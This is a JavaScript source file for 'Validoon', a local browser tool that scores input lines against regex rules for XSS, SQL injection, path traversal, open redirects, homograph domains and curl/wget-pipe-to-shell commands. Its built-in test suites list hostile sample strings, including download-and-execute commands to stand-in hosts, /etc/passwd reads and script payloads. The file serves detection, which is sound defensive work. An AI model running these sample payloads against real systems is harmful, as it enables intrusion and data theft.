/* Validoon - Local-only decision engine
   - No network calls
   - Deterministic scoring
   - Safe DOM binding (DOMContentLoaded + defer)
*/

(() => {
  "use strict";

  // ---------- Utilities ----------
  const nowISO = () => new Date().toISOString();

  const clamp = (n, a, b) => Math.max(a, Math.min(b, n));

  const safeText = (s) => (s ?? "").toString();

  const isProbablyURL = (s) => {
    const v = safeText(s).trim();
    if (!v) return false;
    // Allow URL-like or bare query-like
    if (/^(https?:\/\/)/i.test(v)) return true;
    if (/^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(v)) return true;
    if (/(redirect_uri|returnUrl|return_url|next|url)=/i.test(v)) return true;
    return false;
  };

  // Simple Shannon entropy over bytes-ish chars
  const entropy = (s) => {
    const str = safeText(s);
    if (!str) return 0;
    const map = new Map();
    for (const ch of str) map.set(ch, (map.get(ch) || 0) + 1);
    const len = str.length;
    let e = 0;
    for (const [, count] of map) {
      const p = count / len;
      e -= p * Math.log2(p);
    }
    return Number(e.toFixed(2));
  };

  const uniqPush = (arr, v) => {
    if (!arr.includes(v)) arr.push(v);
  };

  // ---------- Signal detection ----------
  const SIGNALS = {
    REDIRECT_PARAM: {
      label: "REDIRECT_PARAM",
      sev: 55,
      conf: 90,
      test: (s) => /(redirect_uri|returnUrl|return_url|next|url)\s*=\s*(\/\/|https?:|javascript:|data:)/i.test(s)
                  || /(redirect_uri|returnUrl|return_url|next|url)\s*=\s*[^&]*%2f%2f/i.test(s),
    },
    AUTH_ENDPOINT: {
      label: "AUTH_ENDPOINT",
      sev: 45,
      conf: 80,
      test: (s) => /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|\/login\b|\/authorize\b)/i.test(s)
                  || /(accounts\.google\.com\/signin|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
    },
    BASE64_DECODE: {
      label: "BASE64_DECODE",
      sev: 35,
      conf: 70,
      test: (s) => /base64,/i.test(s)
                  || /\beyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\b/.test(s) // JWT-like
                  || /\b[A-Za-z0-9+/]{24,}={0,2}\b/.test(s),
    },
    OBFUSCATION: {
      label: "OBFUSCATION",
      sev: 35,
      conf: 67,
      test: (s) => /%[0-9a-f]{2}/i.test(s)
                  || /(\\x[0-9a-f]{2}|\\u[0-9a-f]{4})/i.test(s)
                  || /powershell\s+-enc\b/i.test(s)
                  || /\b[A-Za-z0-9+/]{60,}={0,2}\b/.test(s),
    },
    "SQL:SQLI_TAUTOLOGY": {
      label: "SQL:SQLI_TAUTOLOGY",
      sev: 75,
      conf: 85,
      test: (s) => /\b(or|and)\b\s+('?\d'?\s*=\s*'?\d'?)/i.test(s)
                  || /\bwhere\b\s+1\s*=\s*1\b/i.test(s)
                  || /'?\s*or\s*'1'\s*=\s*'1/i.test(s)
                  || /\bunion\b\s+select\b/i.test(s),
    },
    "SQL:SQLI_UNION_ALL": {
      label: "SQL:SQLI_UNION_ALL",
      sev: 80,
      conf: 80,
      test: (s) => /\bunion\b\s+all\b/i.test(s) || /\bunion\b\s+select\b/i.test(s),
    },
    "XSS/JS_SCRIPT": {
      label: "XSS/JS_SCRIPT",
      sev: 85,
      conf: 85,
      test: (s) => /<script\b/i.test(s)
                  || /\bonerror\s*=\s*alert\(/i.test(s)
                  || /\bonload\s*=\s*alert\(/i.test(s)
                  || /\bjavascript:\s*alert\(/i.test(s)
                  || /data:text\/html/i.test(s),
    },
    "LFI:ETC_PASSWD": {
      label: "LFI:ETC_PASSWD",
      sev: 80,
      conf: 75,
      test: (s) => /\.\.\/\.\.\//.test(s)
                  || /etc\/passwd/i.test(s)
                  || /Windows\\System32\\drivers\\etc\\hosts/i.test(s),
    },
    "CMD:CMD_CHAIN": {
      label: "CMD:CMD_CHAIN",
      sev: 85,
      conf: 85,
      test: (s) => /(\&\&|\|\||\|\s*(sh|bash)|;\s*(sh|bash|cmd|powershell))/i.test(s)
                  || /\b(powershell|cmd\.exe|bash|sh)\b/i.test(s),
    },
    DOWNLOAD_TOOL: {
      label: "DOWNLOAD_TOOL",
      sev: 90,
      conf: 90,
      test: (s) => /\b(curl|wget)\b.*\b(sh|bash)\b/i.test(s)
                  || /\|\s*(sh|bash)\b/i.test(s),
    },
    HOMOGRAPH_RISK: {
      label: "HOMOGRAPH_RISK",
      sev: 60,
      conf: 70,
      test: (s) => /xn--/i.test(s)
                  || /\bpaypaI\.com\b/i.test(s) // I vs l
                  || /\bmicros0ft\.com\b/i.test(s) // 0 vs o
                  || /\bev[l1]\.com\b/i.test(s),
    },
  };

  const classifyType = (raw) => {
    const s = safeText(raw).trim();
    if (!s) return "Data";
    // Very simple heuristic: exploit if contains obvious payload tokens
    const exploitTokens = [
      "<script", "onerror=", "onload=", "javascript:", "data:text/html",
      "union select", "etc/passwd", "windows\\system32", "curl ", "wget ",
      "powershell -enc", "||", "&&", "| sh", "| bash",
      "../", "alert("
    ];
    const lower = s.toLowerCase();
    if (exploitTokens.some(t => lower.includes(t))) return "Exploit";
    if (isProbablyURL(s)) return "URL";
    return "Data";
  };

  const scanLine = (raw) => {
    const input = safeText(raw);
    const trimmed = input.trim();
    const hits = [];
    if (!trimmed) {
      return {
        input,
        type: "Data",
        decision: "ALLOW",
        severity: 0,
        confidence: 0,
        entropy: 0,
        hits: []
      };
    }

    // Evaluate signals
    for (const key of Object.keys(SIGNALS)) {
      const sig = SIGNALS[key];
      if (sig.test(trimmed)) {
        hits.push({ label: sig.label, sev: sig.sev, conf: sig.conf });
      }
    }

    const ent = entropy(trimmed);

    // severity/confidence = max of hits
    const severity = hits.length ? Math.max(...hits.map(h => h.sev)) : 0;
    const confidence = hits.length ? Math.max(...hits.map(h => h.conf)) : 0;

    // Decision policy (deterministic)
    // - BLOCK: severe exploit signals or high severity >= 80
    // - WARN: medium severity >= 35
    // - ALLOW: otherwise
    let decision = "ALLOW";

    const hasCritical = hits.some(h =>
      ["XSS/JS_SCRIPT", "DOWNLOAD_TOOL", "CMD:CMD_CHAIN", "LFI:ETC_PASSWD"].includes(h.label)
    );

    if (hasCritical || severity >= 80) decision = "BLOCK";
    else if (severity >= 35) decision = "WARN";

    // Guard: benign homograph examples can be tricky; keep WARN at most if only HOMOGRAPH_RISK
    if (hits.length === 1 && hits[0].label === "HOMOGRAPH_RISK") {
      decision = "WARN";
    }

    return {
      input: trimmed,
      type: classifyType(trimmed),
      decision,
      severity,
      confidence,
      entropy: ent,
      hits
    };
  };

  const summarizeSignals = (rows) => {
    const map = new Map();
    for (const r of rows) {
      for (const h of r.hits || []) {
        map.set(h.label, (map.get(h.label) || 0) + 1);
      }
    }
    const out = [...map.entries()].map(([label, count]) => ({ label, count }));
    out.sort((a, b) => b.count - a.count);
    return out;
  };

  const computeSystemVerdict = (rows) => {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    let peakSeverity = 0;
    let peakConfidence = 0;

    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      else if (r.decision === "WARN") counts.warn++;
      else counts.block++;

      peakSeverity = Math.max(peakSeverity, r.severity || 0);
      peakConfidence = Math.max(peakConfidence, r.confidence || 0);
    }

    // Verdict rules:
    // - DANGER if any BLOCK or peakSeverity >= 85
    // - SUSPICIOUS if any WARN
    // - SECURE otherwise
    let verdict = "SECURE";
    if (counts.block > 0 || peakSeverity >= 85) verdict = "DANGER";
    else if (counts.warn > 0) verdict = "SUSPICIOUS";

    // Confidence fallback
    if (verdict !== "SECURE" && peakConfidence === 0) peakConfidence = 70;

    return { verdict, peakSeverity, confidence: peakConfidence, counts };
  };

  const buildReasons = (signals, system) => {
    // Primary reasons focus on what actually appeared
    const reasons = [];
    const labels = signals.map(s => s.label);

    if (labels.includes("REDIRECT_PARAM")) uniqPush(reasons, "Suspicious redirect parameter patterns detected.");
    if (labels.includes("AUTH_ENDPOINT")) uniqPush(reasons, "Auth endpoints combined with redirects can indicate phishing.");
    if (labels.includes("HOMOGRAPH_RISK")) uniqPush(reasons, "Potential homograph / lookalike domain risk detected.");
    if (labels.includes("OBFUSCATION")) uniqPush(reasons, "Obfuscation patterns detected (encoding/escape/high-entropy).");
    if (labels.includes("BASE64_DECODE")) uniqPush(reasons, "Base64/JWT-like data detected (may hide payloads).");
    if (labels.includes("XSS/JS_SCRIPT")) uniqPush(reasons, "Script injection patterns detected (XSS / javascript: / HTML payload).");
    if (labels.includes("LFI:ETC_PASSWD")) uniqPush(reasons, "Path traversal / local file inclusion patterns detected.");
    if (labels.includes("CMD:CMD_CHAIN")) uniqPush(reasons, "Command chaining patterns detected (&&, ||, pipes, shells).");
    if (labels.includes("DOWNLOAD_TOOL")) uniqPush(reasons, "Download-and-execute patterns detected (curl/wget | sh).");
    if (labels.includes("SQL:SQLI_TAUTOLOGY") || labels.includes("SQL:SQLI_UNION_ALL")) uniqPush(reasons, "SQL injection-like patterns detected (tautology/UNION).");

    if (system.verdict === "SECURE") {
      uniqPush(reasons, "No high-severity exploit patterns detected.");
    }

    return reasons.slice(0, 6);
  };

  const buildRemediation = (signals, system) => {
    const steps = [];
    const labels = signals.map(s => s.label);

    if (system.verdict === "DANGER") uniqPush(steps, "Block this input in the pipeline.");
    if (labels.includes("REDIRECT_PARAM")) uniqPush(steps, "Do NOT open; verify the domain ownership and redirect target.");
    if (labels.includes("HOMOGRAPH_RISK")) uniqPush(steps, "Manually inspect the domain for lookalike characters (IDN/punycode).");
    if (labels.includes("XSS/JS_SCRIPT")) uniqPush(steps, "Treat as malicious; sanitize/strip scripts and event handlers.");
    if (labels.includes("SQL:SQLI_TAUTOLOGY") || labels.includes("SQL:SQLI_UNION_ALL")) uniqPush(steps, "Block and review logs; enforce parameterized queries upstream.");
    if (labels.includes("LFI:ETC_PASSWD")) uniqPush(steps, "Block; check file path validation rules.");
    if (labels.includes("DOWNLOAD_TOOL") || labels.includes("CMD:CMD_CHAIN")) uniqPush(steps, "Block; investigate endpoint/source host; isolate environment if executed.");
    if (labels.includes("OBFUSCATION") || labels.includes("BASE64_DECODE")) uniqPush(steps, "Decode only in a controlled sandbox if required for analysis.");
    uniqPush(steps, "Export JSON and attach to the ticket/SOC workflow.");

    return steps.slice(0, 6);
  };

  // ---------- Test Suites ----------
  const TEST_A = [
    "hello world",
    "https://example.com/",
    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evil.com",
    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evl1.com",
    "http://xn--pple-43d.com/login",
    "http://paypaI.com/security",
    "http://micros0ft.com/account/verify",
    "https://good.com/redirect?url=https://evil.com",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "redirect_uri=https://evil.com",
    "returnUrl=//evil.com",
    "next=//evil.com",
    "url=javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; ls -la",
    "| whoami",
    "&& curl http://evl1.tld/payload.sh | sh",
    "powershell -enc SQBFAFgA",
    "SELECT * FROM users WHERE 1=1 OR 1=1",
    "' OR '1'='1",
    "admin'--",
    "UNION SELECT username,password FROM users",
    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
    "Authorization: Bearer abc.def.ghi",
    "AKIAIOSFODNN7EXAMPLE",
    "-----BEGIN PRIVATE KEY-----",
    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
    "-----END PRIVATE KEY-----",
    "{\"op\":\"add\",\"path\":\"/admin\",\"value\":true}",
    "wget http://evl1.tld/a.sh -O- | sh",
    "curl -s http://evl1.tld/a | bash",
    "<script src=https://static.cloudflareinsights.com/beacon.min.js></script>"
  ];

  // A second suite (variation) to catch edge-cases
  const TEST_B = [
    "https://good.com/path",
    "next=https%3A%2F%2Fevil.com",
    "return_url=http://evil.com",
    "http://xn--googl-fsa.com/login",
    "<img src=x onerror=confirm(1)>",
    "<script>fetch('https://evil.com')</script>",
    "data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==",
    "../../../../../etc/passwd",
    "cat /etc/passwd",
    "&& wget http://bad.tld/x | sh",
    "curl http://bad.tld/x | bash",
    "SELECT * FROM users WHERE '1'='1'",
    "UNION ALL SELECT * FROM secrets",
    "powershell -enc JABXAGgAbwBhAG0AaQA=",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxx.yyy",
  ];

  // ---------- DOM & Rendering ----------
  const $ = (id) => document.getElementById(id);

  const renderRows = (rows) => {
    const tbody = $("tbodyRows");
    tbody.textContent = "";
    const frag = document.createDocumentFragment();

    for (const r of rows) {
      const tr = document.createElement("tr");

      const tdType = document.createElement("td");
      tdType.textContent = r.type;

      const tdInput = document.createElement("td");
      tdInput.className = "mono";
      tdInput.textContent = r.input;

      const tdDecision = document.createElement("td");
      const span = document.createElement("span");
      span.className = "decision " + (r.decision || "").toLowerCase();
      span.textContent = r.decision;
      tdDecision.appendChild(span);

      const tdSev = document.createElement("td");
      tdSev.textContent = `${r.severity}%`;

      const tdConf = document.createElement("td");
      tdConf.textContent = `${r.confidence}%`;

      const tdEnt = document.createElement("td");
      tdEnt.textContent = r.entropy;

      tr.appendChild(tdType);
      tr.appendChild(tdInput);
      tr.appendChild(tdDecision);
      tr.appendChild(tdSev);
      tr.appendChild(tdConf);
      tr.appendChild(tdEnt);

      frag.appendChild(tr);
    }

    tbody.appendChild(frag);
  };

  const renderSignals = (signals) => {
    const box = $("signalChips");
    box.textContent = "";
    const frag = document.createDocumentFragment();

    for (const s of signals) {
      const el = document.createElement("div");
      el.className = "chip";
      el.textContent = s.label;

      const c = document.createElement("span");
      c.className = "c";
      c.textContent = `x${s.count}`;

      el.appendChild(c);
      frag.appendChild(el);
    }

    box.appendChild(frag);
  };

  const renderLists = (reasons, rem) => {
    const ulR = $("listReasons");
    const ulM = $("listRemediate");
    ulR.textContent = "";
    ulM.textContent = "";

    for (const x of reasons) {
      const li = document.createElement("li");
      li.textContent = x;
      ulR.appendChild(li);
    }
    for (const x of rem) {
      const li = document.createElement("li");
      li.textContent = x;
      ulM.appendChild(li);
    }
  };

  const renderKPIs = (system) => {
    $("kpiPeak").textContent = `${system.peakSeverity}%`;
    $("kpiConf").textContent = `${system.confidence}%`;
    $("kpiScans").textContent = `${system.counts.scans}`;
    $("kpiAllow").textContent = `${system.counts.allow}`;
    $("kpiWarn").textContent = `${system.counts.warn}`;
    $("kpiBlock").textContent = `${system.counts.block}`;

    const badge = $("badgeVerdict");
    badge.classList.remove("secure","suspicious","danger");

    if (system.verdict === "SECURE") {
      badge.textContent = "SECURE";
      badge.classList.add("secure");
    } else if (system.verdict === "SUSPICIOUS") {
      badge.textContent = "SUSPICIOUS";
      badge.classList.add("suspicious");
    } else {
      badge.textContent = "DANGER";
      badge.classList.add("danger");
    }
  };

  const buildExport = (rows, system, signals) => {
    return {
      generatedAt: nowISO(),
      verdict: system.verdict,
      peakSeverity: system.peakSeverity,
      confidence: system.confidence,
      counts: system.counts,
      signals,
      rows
    };
  };

  const downloadJSON = (obj) => {
    const txt = JSON.stringify(obj, null, 2);
    const blob = new Blob([txt], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `validoon_report_${nowISO().replace(/[:.]/g, "-")}.json`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  };

  const clearAll = () => {
    $("inputArea").value = "";
    renderRows([]);
    renderSignals([]);
    renderLists([], []);
    renderKPIs({ verdict: "SECURE", peakSeverity: 0, confidence: 0, counts: { scans: 0, allow: 0, warn: 0, block: 0 } });
  };

  const runScan = () => {
    const text = $("inputArea").value || "";
    const lines = text.split(/\r?\n/).map(s => s.trim()).filter(Boolean);

    const rows = lines.map(scanLine);

    const system = computeSystemVerdict(rows);
    const signals = summarizeSignals(rows);

    renderRows(rows);
    renderSignals(signals);

    const reasons = buildReasons(signals, system);
    const remediate = buildRemediation(signals, system);
    renderLists(reasons, remediate);

    renderKPIs(system);

    // Store last export in memory (no persistence)
    window.__VALIDOON_LAST__ = buildExport(rows, system, signals);
  };

  const openModal = () => {
    const b = $("modalBackdrop");
    b.style.display = "flex";
    b.setAttribute("aria-hidden", "false");
  };

  const closeModal = () => {
    const b = $("modalBackdrop");
    b.style.display = "none";
    b.setAttribute("aria-hidden", "true");
  };

  // ---------- DOM Ready ----------
  document.addEventListener("DOMContentLoaded", () => {
    // Bind buttons safely
    $("btnScan").addEventListener("click", runScan);
    $("btnExport").addEventListener("click", () => {
      if (!window.__VALIDOON_LAST__) runScan();
      downloadJSON(window.__VALIDOON_LAST__ || buildExport([], computeSystemVerdict([]), []));
    });

    $("btnLoadA").addEventListener("click", () => {
      $("inputArea").value = TEST_A.join("\n");
      runScan();
    });

    $("btnLoadB").addEventListener("click", () => {
      $("inputArea").value = TEST_B.join("\n");
      runScan();
    });

    $("btnClear").addEventListener("click", clearAll);

    $("btnInfo").addEventListener("click", openModal);
    $("btnCloseModal").addEventListener("click", closeModal);
    $("modalBackdrop").addEventListener("click", (e) => {
      if (e.target === $("modalBackdrop")) closeModal();
    });
    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape") closeModal();
    });

    // Initial state
    clearAll();
  });
})();
